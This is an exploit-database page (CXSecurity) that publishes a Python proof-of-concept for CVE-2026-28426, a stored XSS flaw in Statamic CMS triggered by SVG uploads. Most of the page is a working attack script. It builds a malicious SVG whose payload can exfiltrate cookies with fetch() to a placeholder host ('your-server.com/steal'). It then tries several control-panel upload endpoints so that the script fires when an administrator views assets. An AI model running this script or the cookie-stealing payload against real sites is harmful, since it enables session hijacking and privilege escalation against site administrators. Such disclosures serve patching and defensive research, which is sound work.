---
title: Statamic CMS <  5.73.11 & <  6.4.0 Stored XSS via SVG Upload Leading to Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2026030003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-02
fetch_date: 2026-03-03T04:11:35.320295
---

# Statamic CMS <  5.73.11 & <  6.4.0 Stored XSS via SVG Upload Leading to Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Statamic CMS < 5.73.11 & < 6.4.0 Stored XSS via SVG Upload Leading to Privilege Escalation** **2026.03.02**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-28426](https://cxsecurity.com/cveshow/CVE-2026-28426/ "Click to see CVE-2026-28426")**  CWE: **[CWE-79 Improper Neutralization of Input During Web Page Generation (&#039;Cross-site Scripting&#039;)](https://cxsecurity.com/cwe/CWE-79%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20%28%26#039;Cross-site Scripting&#039;) "Click to see CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')")**  **[**Dork:** NO](https://cxsecurity.com/dorks/)** | |

#!/usr/bin/env python3
# Exploit Title: Statamic CMS Stored XSS via SVG Upload
# CVE: CVE-2026-28426
# Date: 2026-02-28
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Vendor Homepage: https://statamic.com
# Software Link: https://github.com/statamic/cms
# Affected: Statamic CMS < 5.73.11 and < 6.4.0
# Category: Webapps
# Platform: PHP
# Exploit Type: Stored Cross-Site Scripting (XSS)
# CVSS: 8.7 (High)
# CWE: CWE-79
# Description: Stored XSS in Statamic CMS SVG/icon components allows authenticated users
# to upload malicious SVG files containing JavaScript that executes in the
# context of privileged users (e.g. admins) when viewing icons/assets.
# Fixed in: 5.73.11 and 6.4.0
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ▄▄▄▄· ▄▄▄ . ▄▄ • ▄▄▄▄▄ ▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄▄▄▄▄▄▄ .▄▄▄ ▄• ▄▌ ║
║ ▐█ ▀█▪▀▄.▀·▐█ ▀ ▪•██ ▪ ▀▄ █·▐█ ▀█ ▐█ ▄█•██ ▀▀▄.▀·▀▄ █·█▪██▌ ║
║ ▐█▀▀█▄▐▀▀▪▄▄█ ▀█ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██▀· ▐█.▪▐▀▀▪▄▐▀▀▄ █▌▐█· ║
║ ██▄▪▐█▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐█▪·• ▐█▌·▐█▄▄▌▐█•█▌▐█▄█▌ ║
║ ·▀▀▀▀ ▀▀▀ ·▀▀▀▀ ▀▀▀ ▀█▄▀▪.▀ ▀ ▀ ▀ .▀ ▀▀▀ ▀▀▀ .▀ ▀ ▀▀▀ ║
║ ║
║ b a n y a m e r \_ s e c u r i t y ║
║ ║
║ >>> Silent Hunter • Shadow Presence <<< ║
║ ║
║ Operator : Mohammed Idrees Banyamer Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ CVE-2026-28426 • Statamic Stored XSS via SVG ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
import requests, argparse, os
from urllib.parse import urljoin
def create\_malicious\_svg(payload\_type="alert"):
if payload\_type == "alert":
js = 'alert("XSS PoC CVE-2026-28426\\nCookie: " + document.cookie);'
elif payload\_type == "exfil":
js = 'fetch("https://your-server.com/steal?cookie="+encodeURIComponent(document.cookie),{method:"GET"});'
else:
js = payload\_type
svg\_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
<script type="text/javascript">
{js}
</script>
<rect width="200" height="200" fill="lightblue"/>
<text x="50" y="100" font-size="20">XSS PoC</text>
</svg>'''
with open("malicious.svg", "w", encoding="utf-8") as f:
f.write(svg\_content)
print("[+] Malicious SVG created: malicious.svg")
return "malicious.svg"
def upload\_svg(target\_url, session\_cookie, svg\_path="malicious.svg"):
possible\_endpoints = [
"/cp/assets/upload",
"/cp/assets/containers/assets/upload",
"/cp/icons/upload",
"/cp/assets/upload-asset",
]
files = {"file": (os.path.basename(svg\_path), open(svg\_path, "rb"), "image/svg+xml")}
cookies = {"statamic": session\_cookie}
headers = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) PoC/1.0",
"X-Requested-With": "XMLHttpRequest",
}
uploaded = False
for endpoint in possible\_endpoints:
upload\_url = urljoin(target\_url.rstrip("/") + "/", endpoint.lstrip("/"))
print(f"[\*] Trying upload to: {upload\_url}")
try:
r = requests.post(
upload\_url,
files=files,
cookies=cookies,
headers=headers,
timeout=15,
allow\_redirects=False
)
if r.status\_code in (200, 201, 202, 204):
print(f"[+] Upload SUCCESS (HTTP {r.status\_code}) → {upload\_url}")
uploaded = True
break
else:
print(f"[-] HTTP {r.status\_code}")
except Exception as e:
print(f"[!] Error: {e}")
if not uploaded:
print("[!] Upload failed — check endpoint via browser dev tools")
def main():
parser = argparse.ArgumentParser(description="CVE-2026-28426 Statamic Stored XSS Exploit")
parser.add\_argument("target", help="Base URL (e.g. http://statamic.local)")
parser.add\_argument("--cookie", required=True, help="Statamic session cookie")
parser.add\_argument("--payload", default="alert", help="alert | exfil | custom JS")
args = parser.parse\_args()
svg\_file = create\_malicious\_svg(args.payload)
upload\_svg(args.target, args.cookie, svg\_file)
print("\nTrigger: Log in as admin → view icon picker / assets → XSS executes")
if \_\_name\_\_ == "\_\_main\_\_":
main()

**##### References:**

https://github.com/statamic/cms/security/advisories/GHSA-5vrj-wf7v-5wr7

https://github.com/statamic/cms/releases/tag/v5.73.11

https://github.com/statamic/cms/releases/tag/v6.4.0

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030003)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top